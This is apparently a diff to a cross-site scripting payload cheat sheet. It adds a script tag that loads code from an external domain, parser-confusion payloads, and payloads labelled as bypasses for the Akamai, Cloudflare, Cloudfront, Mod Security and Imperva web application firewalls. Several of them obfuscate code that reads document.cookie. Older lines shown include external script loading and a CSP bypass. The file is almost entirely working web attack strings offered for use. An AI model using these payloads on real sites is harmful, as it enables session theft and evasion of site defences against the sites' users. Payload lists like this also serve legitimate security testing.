@@ -1,6 +1,9 @@
 # simple
 <script>alert(1)</script>
 
+# tiny external XSS
+<script/src=//Ǌ.₨></script>
+
 # filter bypass (no parenthises, dots, spaces, quotes)
 <script/src=//6a%2elv></script>
 <script/src=//6a。lv></script>
@@ -17,7 +20,7 @@
 # object (firefox only)
 <object data=javascript:alert(1337)>
 
-# no parenthises
+# no parentheses
 <script>s = document.createElement`script`;s.src = "//path.to/external.js";document["body"].append`${s}`;</script>
 
 # bypass CSP (if google.com is in allowed CSP)
@@ -26,3 +29,31 @@
 # hide XSS inside style tag
 <svg><style><script>alert(1)</script></style></svg>
 <math><style><img src onerror=alert(2)/></style></math>
+
+# wtf
+<script>var div = '<!--<script>'</script>/-alert(1)</script>
+<script>var div = "<!--<script>"</script><div>/-alert(1)</script>
+<script>a = '</script><svg onload=alert(1)>';</script>
+
+# bypass WAF
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+
+# bypass Akamai
+"onmouseover=window['al'+'er'+(['t','b','c'][0])](document['cooki'+(['e','c','z'][0])]);"
+
+# bypass Cloudflare
+<svg onload=alert&#0000000040document.cookie)>
+<svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>
+
+# bypass Cloudfront
+<details/open/ontoggle=confirm('XSS')>
+6'"()&%"><svg/onload=prompt(1)>/
+;window/*aabb*/['al'+'ert'](document./*aabb*/Location);
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//>
+
+# bypass Mod Security
+<svg onload='new Function*["Y000!"].find(al\u0065rt)*'>
+
+# bypass Imperva
+<details x=xxxXxXXXXXXXXXXXXXXXXXXXXXXXXKXXXXXXXXXXX 2 Open ontoggle=k&#0000000000061;alert&#x000000028;origin&#x000029;>
